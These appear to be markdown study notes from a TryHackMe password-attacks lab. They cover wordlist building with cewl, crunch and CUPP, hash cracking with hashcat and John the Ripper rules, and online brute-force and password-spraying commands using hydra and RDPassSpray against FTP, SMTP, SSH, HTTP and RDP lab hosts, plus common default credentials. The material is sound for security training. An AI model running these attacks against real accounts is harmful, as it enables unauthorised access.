- Password profiling
- Password attacks techniques
- Online password attacks

### wordlists
 [top most common and seen passwords](https://www.skullsecurity.org/wiki/Passwords)

 Here are some website lists that provide default passwords for various products.

- [https://cirt.net/passwords](https://cirt.net/passwords)
- [https://default-password.info/](https://default-password.info/)
- [https://datarecovery.com/rd/default-passwords/](https://datarecovery.com/rd/default-passwords/)

 suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin.
 
- [ leaked passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases)


### Combined wordlists
cat file1.txt file2.txt file3.txt > combined_list.txt 
sort combined_list.txt | uniq -u > cleaned_combined_list.txt

### Customized Wordlists

Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:

user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs

-w will write the contents to a file. In this case, list.txt.

-m 5 gathers strings (words) that are 5 characters or more

-d 5 is the depth level of web crawling/spidering (default 2)

http://thm.labs is the URL that will be used

### Username Wordlists
 there is a tool **username_generator** that could help create a list with most of the possible combinations of passwords if we have a first name and last name.
if know the user is called john smith a password  can be:
 - **{first name}:** john
- **{last name}:** smith
- **{first name}{last name}:  johnsmith** 
- **{last name}{first name}:  smithjohn**  
- first letter of the **{first name}{last name}: jsmith** 
- first letter of the **{last name}{first name}: sjohn**  
- first letter of the **{first name}.{last name}: j.smith** 
- first letter of the **{first name}-{last name}: j-smith** 
- and so on

```shell-session
user@thm$ git clone https://github.com/therodri2/username_generator.git
user@thm$ cd username_generator
user@thm$ echo "John Smith" > users.lst 
user@thm$ python3 username_generator.py -w users.lst
```
### Keyspace Technique

In this technique, we specify a range of characters, numbers, and symbols in our wordlist.

 combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to.

```shell-session
 user@thm$ crunch 2 2 01234abcd -o crunch.txt
```
  
  if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers:
```shell-session
user@thm$ crunch 6 6 -t pass%%
  ```
@ - lower case alpha characters

, - upper case alpha characters

% - numeric characters

^ - special characters including space

### CUPP - Common User Passwords Profiler
 CUPP will take the information supplied and generate a custom wordlist based on what's provided.

```shell-session
 git clone https://github.com/Mebus/cupp.git
 python3 cupp.py -i
```

CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key.

 Pre-created wordlists can be downloaded to your machine as follows:
```shell-session
python3 cupp.py -l

```

### Dictionary attack
A dictionary attack is a technique used to guess passwords by using well-known words or phrases.

we obtain the hash **f806fc5a2a0d5ba2471600758452799c**, and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum:  

1- **What type of hash is this?**  
2- **What wordlist will we be using? Or what type of attack mode could we use?**

To identify the type of hash, we could a tool such as hashid or hash-identifier

and after to crack well use:
```shell-session
hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt --show
```
-a 0  sets the attack mode to a dictionary attack

-m 0  sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.

f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes.

/usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack 

### Brute-Force attack
Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords.

The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice.

```shell-session
user@machine$ hashcat -a 3 ?d?d?d?d --stdout
1234 
0234 
2234 
3234 
9234 
4234 
5234 
8234 
7234 
6234
..
..
..
```

?d?d?d?d -  the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999

### Rule-Based attacks

Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy.

John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf:

```shell-session
user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF 
JumboSingle 
o1 
o2 
i1 
i2 
best64
..
..
```


if we know tha password contains tryhackme:
well put "tryhackme" in the wordlist and apply the 64 best rules to it.
By running we expand our password list from 1 to 76 passwords.
```shell-session
user@machine$ john --wordlist=crunch.txt --rules=best64 --stdout > newlist.txt 

```
```shell-session
user@machine$ john --wordlist=crunch.txt --rules=KoreLogic --stdout > newlist.txt 
```
```shell-session
	user@machine$ john --wordlist=crunch.txt --rules=Single-Extra --stdout > newlist.txt 
```



Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:

[symbols]word[0-9]

```shell-session
user@machine$ sudo vi /etc/john/john.conf 
[List.Rules:THM-Password-Attacks] 
Az"[0-9]" ^[!@#$]
```

[List.Rules:THM-Password-Attacks]  specify the rule name THM-Password-Attacks.

Az represents a single word from the original wordlist/dictionary using -p.

"[0-9]" append a single digit (from 0 to 9) to the end of the word. For two digits, we can add "[0-9][0-9]"  and so on.  

^[!@#$] add a special character at the beginning of each word. ^ means the beginning of the line/word. Note, changing ^ to $ will append the special characters to the end of the line/word.


### Hydra
Online password attacks involve guessing passwords for networked services that use a username and password authentication scheme, including services such as HTTP, SSH, VNC, FTP, SNMP, POP3, etc. This section showcases using hydra which is a common tool used in attacking logins for various network services.

##### FTP  -  brute-force attack against an FTP server. By checking the hydra help options, we know the syntax of attacking the FTP server is as follows:
```shell-session

user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x
```

-l ftp we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

ftp://10.10.x.x the protocol and the IP address or the fully qualified domain name (FDQN) of the target.


##### SMTP
Similar to FTP servers, we can also brute-force SMTP servers using hydra. The syntax is similar to the previous example. The only difference is the targeted protocol. Keep in mind, if you want to try other online password attack tools, you may need to specify the port number, which is 25. Make sure to read the help options of the tool.

```shell-session

user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v
```

##### SSH
SSH brute-forcing can be common if your server is accessible to the Internet. Hydra supports many protocols, including SSH. We can use the previous syntax to perform our attack! It's important to notice that password attacks rely on having an excellent wordlist to increase your chances of finding a valid username and password.

```shell-session

user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v
```

##### HTTP login pages


In this scenario, we will brute-force HTTP login pages. To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST. Checking hydra options: hydra http-get-form -U, we can see that hydra has the following syntax for the http-get-form option:

url:form parameters:condition string[:optional[:optional]

As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite.

```shell-session

user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
```

-l admin  we are specifying a single username, use-L for a username wordlist

-P Path specifying the full path of wordlist, you can specify a single password by using -p.

10.10.x.x the IP address or the fully qualified domain name (FQDN) of the target.

http-get-form the type of HTTP request, which can be either http-get-form or http-post-form.

Next, we specify the URL, path, and conditions that are split using :

login-get/index.php the path of the login page on the target webserver.

username=^USER^&password=^PASS^ the parameters to brute-force, we inject ^USER^ to brute force usernames and ^PASS^ for passwords from the specified dictionary.

The following section is important to eliminate false positives by specifying the 'failed' condition with F=.

And success conditions, S=. You will have more information about these conditions by analyzing the webpage or in the enumeration stage! What you set for these values depends on the response you receive back from the server for a failed login attempt and a successful login attempt. 

Or for example, during the enumeration, we found that the webserver serves logout.php. After logging into the login page with valid credentials, we could guess that we will have logout.php somewhere on the page. Therefore, we could tell hydra to look for the text logout.php within the HTML for every request

S=logout.php the success condition to identify the valid credentials

For example, if you receive a message on the webpage 'Invalid password' after a failed login, set F=Invalid Password.

"invalid password" - the failure string Hydra will search for in the HTTP response to detect a _bad_ login.

-f to stop the brute-forcing attacks after finding a valid username and password






### Password Spray attack

**To be successful in the password spraying attack, we need to enumerate the target and create a list of valid usernames (or email addresses list)**.

a password spraying attack targets many usernames using one common weak password, which could help avoid an account lockout policy.

Common and weak passwords often follow a pattern and format. Some commonly used passwords and their overall format can be found below.

- The current season followed by the current year (SeasonYear). For example, **Fall2020**, **Spring2021**, etc.
- The current month followed by the current year (MonthYear). For example, **November2020**, **March2021**, etc.
- Using the company name along with random numbers (CompanyNameNumbers). For example, TryHackMe01, TryHackMe02.

#### SSH
```shell-session

hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
```

#### RDP

```shell-session
python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -t 10.100.10.240:3026
```

The above output shows that we successfully found valid credentials victim:Spring2021!.

Note that we can specify a domain name using the -d option if we are in an Active Directory environment.

```shell-session
user@THM:~# python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
```
#### Outlook web access (OWA) portal
Tools:

- [SprayingToolkit](https://github.com/byt3bl33d3r/SprayingToolkit) (atomizer.py)
- [MailSniper](https://github.com/dafthack/MailSniper)
#### SMB
- Tool: Metasploit (auxiliary/scanner/smb/smb_login)



